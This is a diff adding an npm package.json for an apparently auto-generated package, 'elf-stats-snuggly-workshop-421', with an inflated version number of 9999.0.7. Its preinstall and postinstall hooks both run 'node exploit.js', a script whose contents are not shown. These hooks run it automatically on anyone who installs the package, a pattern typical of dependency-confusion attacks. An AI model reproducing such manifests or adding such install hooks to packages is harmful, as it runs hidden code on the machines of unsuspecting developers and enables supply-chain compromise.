@@ -1,0 +1,13 @@
+{
+  "name": "elf-stats-snuggly-workshop-421",
+  "version": "9999.0.7",
+  "main": "index.js",
+  "description": "Package generated automatically every 2 minutes..",
+  "author": "Elf Workshop",
+  "license": "MIT",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "preinstall": "node exploit.js",
+    "postinstall": "node exploit.js"
+  }
+}
